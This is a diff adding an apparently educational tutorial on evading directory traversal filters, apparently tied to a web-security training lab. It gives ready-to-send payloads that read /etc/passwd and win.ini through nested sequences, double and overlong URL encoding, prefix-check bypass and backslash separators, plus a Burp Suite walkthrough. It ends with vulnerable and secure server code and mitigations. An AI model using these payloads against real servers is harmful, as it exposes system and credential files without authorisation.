@@ -1,0 +1,251 @@
+# Directory Traversal: Bypassing Defensive Filters (Nested, Encoding, & Prefix)
+
+When developers recognize the danger of _Directory Traversal_ vulnerabilities, their initial instinct is often to implement **custom sanitization filters** to strip or block dangerous strings such as `../`.
+
+However, if these filters are implemented naively—such as through non-recursive single-pass replacement, neglecting multi-layer URL decoding, or relying on simple prefix checks—attackers can bypass the protection and read sensitive system files.
+
+---
+
+## 1. Why Do Blacklist Filters Fail?
+
+Blacklist-based filters attempt to predict and neutralize malicious patterns. This approach suffers from inherent architectural flaws:
+1. **Single-Pass Stripping:** The server replaces `../` exactly once across the input string.
+2. **Multi-layer Decoding Discrepancies:** A Web Application Firewall (WAF) or Reverse Proxy evaluates an encoded payload once, while the backend application performs a second decode pass prior to filesystem operations.
+3. **Naive Prefix Validation:** The server verifies that the input begins with a specific directory path without inspecting subsequent traversal operators.
+
+---
+
+## 2. Exploitation Flow: Three Primary Filter Bypass Techniques
+
+![Directory Traversal Filter Bypass](/images/directory-traversal-filtering-bypass.svg)
+
+---
+
+## 3. Four Popular Filter Bypass Techniques
+
+Here are the most common methods employed to circumvent defensive Directory Traversal filters:
+
+---
+
+### Technique 1: Non-Recursive Stripping (Nested Sequences `....//`)
+
+Many developers implement simple string replacement functions like this:
+
+```javascript
+// ❌ VULNERABLE: Strips "../" once (Single-pass non-recursive)
+function sanitize(input) {
+  return input.replace(/\.\.\//g, "");
+}
+```
+
+#### Attacker Strategy:
+Attackers nest the `../` sequence inside another `../` pattern:
+```text
+....//....//....//etc/passwd
+```
+
+1. Note the string structure: `..` + `../` + `/`
+2. When the server strips the inner `../`:
+   ```text
+   ..[ ../ ]/  ==> leaves ".." and "/" ==> collapses into "../"
+   ```
+3. Following the sanitization pass, the surrounding characters reform the complete traversal payload:
+   ```text
+   "../../../etc/passwd"
+   ```
+4. The server subsequently opens `/etc/passwd`!
+
+#### Nested Variations:
+- `..././..././..././etc/passwd`
+- `....\/....\/....\/etc/passwd` (mixed forward slash and backslash)
+
+---
+
+### Technique 2: Double URL Encoding (`%252e%252e%252f`)
+
+In modern cloud architectures, user requests pass through multiple tiers: a **WAF / Reverse Proxy** (e.g. Cloudflare, AWS WAF, Nginx) and a **Backend Application Server** (Express, Spring, Tomcat, PHP).
+
+#### Mechanism:
+If the WAF decodes URL characters once during inspection, attackers can supply a **Double-Encoded** payload (encoding `%` as `%25`):
+
+| Character | Single URL Encode | Double URL Encode |
+| :--- | :--- | :--- |
+| `.` (Dot) | `%2e` | `%252e` |
+| `/` (Slash) | `%2f` | `%252f` |
+| `\` (Backslash) | `%5c` | `%255c` |
+| **`../`** | **`%2e%2e%2f`** | **`%252e%252e%252f`** |
+
+#### Execution Flow:
+1. Attacker sends: `GET /image?filename=%252e%252e%252fetc/passwd`
+2. **WAF / Reverse Proxy** executes Pass 1 Decode:
+   - `%252e` becomes `%2e`
+   - `%252f` becomes `%2f`
+   - The WAF inspects the string `%2e%2e%2f`, detects no raw dots or slashes, and forwards the request.
+3. **Backend Server / Framework** executes Pass 2 Decode before filesystem calls:
+   - `%2e%2e%2f` resolves to `../`
+   - The backend retrieves `/var/www/images/../etc/passwd`!
+
+#### Overlong UTF-8 Unicode Encoding:
+Legacy web servers or non-standard UTF-8 parsers can be vulnerable to overlong byte representations:
+- `%c0%af` (Overlong 2-byte representation of `/`)
+- `%e0%80%af` (Overlong 3-byte representation of `/`)
+- `%c1%9c` (Overlong representation of `\`)
+
+---
+
+### Technique 3: Validation of Start of Path (Prefix Restriction)
+
+Some applications require the parameter to start with an approved directory:
+
+```javascript
+// ❌ VULNERABLE: Only verifies the leading path prefix
+if (!filename.startsWith("/var/www/images/")) {
+  return res.status(400).send("Path must start with /var/www/images/");
+}
+```
+
+#### Attacker Strategy:
+Fulfill the enforced prefix requirement, then append traversal sequences to step out of the directory:
+
+```http
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+```
+
+1. The server confirms `startsWith("/var/www/images/")` → **PASSES**.
+2. The operating system filesystem call normalizes `/var/www/images/../../../etc/passwd` directly to `/etc/passwd`.
+
+---
+
+### Technique 4: Mixed Slashes & Windows Normalization (`..\`, `..\/`)
+
+On Windows operating systems and web containers running under Windows (IIS, Tomcat on Windows), both forward slashes (`/`) and backslashes (`\`) serve as valid directory separators.
+
+If a filter specifically blocks `../`:
+- Attackers utilize backslashes: `..\..\..\windows\win.ini`
+- Or mixed separators: `..\/..\/..\etc/passwd`
+- URL-encoded backslashes: `%2e%2e%5c%2e%2e%5c`
+
+---
+
+## 4. Step-by-Step Practical Exploitation with Burp Suite
+
+Follow this methodology when testing Directory Traversal filters in **Burp Suite**:
+
+---
+
+### Step 1: Intercept Request & Observe Filter Behavior
+1. Open the embedded **Burp Suite** browser and navigate to the application.
+2. Locate an image retrieval request in **Proxy** > **HTTP history** (`GET /image?filename=30.jpg`).
+3. Send the request to **Burp Repeater** (`Ctrl + R` / `Cmd + R`).
+4. Test standard traversal:
+   ```http
+   GET /image?filename=../../../etc/passwd HTTP/1.1
+   ```
+5. If the server replies with `400 Bad Request` or `404 Not Found (File not found /images/etc/passwd)`, an active filter has stripped or blocked the input.
+
+---
+
+### Step 2: Test Nested Stripping Sequences (`....//`)
+1. In Repeater, replace the parameter with:
+   ```http
+   GET /image?filename=....//....//....//etc/passwd HTTP/1.1
+   ```
+2. Click **Send**.
+3. If the server responds with `200 OK` and the contents of `/etc/passwd`, non-recursive stripping is confirmed!
+
+---
+
+### Step 3: Test Double URL Encoding
+1. If nested stripping fails, test double encoding:
+   ```http
+   GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1
+   ```
+2. Click **Send**.
+3. A `200 OK` response indicates successful WAF evasion!
+
+---
+
+### Step 4: Test Start-of-Path Validation
+1. If the server returns error messages like *"Path must begin with /var/www/images/"*:
+   ```http
+   GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+   ```
+2. Click **Send**.
+3. The system file `/etc/passwd` is returned and the challenge is marked **Solved**! 🎉
+
+---
+
+## 5. Backend Source Code: Vulnerable vs. Secure
+
+### ❌ Vulnerable Implementation (Blacklist & Partial Verification)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  let filename = req.query.filename as string;
+
+  // ❌ FLAW 1: Single-pass replace (Vulnerable to ....//)
+  filename = filename.replace(/\.\.\//g, "");
+
+  // ❌ FLAW 2: Naive startsWith check (Vulnerable to prefix + ../../)
+  if (!filename.startsWith("/var/www/images/")) {
+    filename = "/var/www/images/" + filename;
+  }
+
+  // ❌ path.resolve executes remaining traversal sequences
+  const finalPath = path.resolve(filename);
+  res.sendFile(finalPath);
+});
+```
+
+---
+
+### ✅ Secure Implementation (Strict Regex Whitelist & Canonical Path Verification)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const BASE_DIR = path.resolve("/var/www/public/images");
+  const filename = req.query.filename as string;
+
+  if (!filename || typeof filename !== "string") {
+    return res.status(400).json({ error: "Invalid parameter provided." });
+  }
+
+  // 1. Strict Whitelisting: Reject dots, slashes, backslashes, and null bytes
+  // Only permit alphanumeric filenames and authorized extensions
+  const isSafe = /^[a-zA-Z0-9_-]+\.(jpg|jpeg|png|gif|webp)$/.test(filename);
+  if (!isSafe) {
+    return res.status(400).json({ error: "Illegal filename detected." });
+  }
+
+  // 2. Canonical Path Resolution: Ensure target remains strictly inside BASE_DIR
+  const targetPath = path.resolve(BASE_DIR, filename);
+
+  if (!targetPath.startsWith(BASE_DIR + path.sep)) {
+    return res.status(403).json({ error: "Access outside working directory denied." });
+  }
+
+  // 3. Verify file existence before serving
+  if (!fs.existsSync(targetPath)) {
+    return res.status(404).json({ error: "File not found." });
+  }
+
+  return res.sendFile(targetPath);
+});
+```
+
+---
+
+## 6. Mitigation Summary & Best Practices
+
+1. **Abandon Blacklist Filters (`replace` / `strip`):**
+   Never rely on simplistic string removal functions for filesystem authorization.
+2. **Enforce Strict Character Whitelists:**
+   Permit solely `^[a-zA-Z0-9_-]+\.[a-zA-Z]{3,4}$`.
+3. **Verify Canonical Paths (`startsWith(BASE_DIR + path.sep)`):**
+   Always normalize paths using canonicalization functions (`path.resolve()` or `realpath()`) and assert that the target path resides within the designated directory.
+4. **Utilize Indirect Resource Identifiers:**
+   Store uploaded media using randomized identifiers (e.g. UUID v4) and reference files through database lookups rather than client-supplied filesystem names.
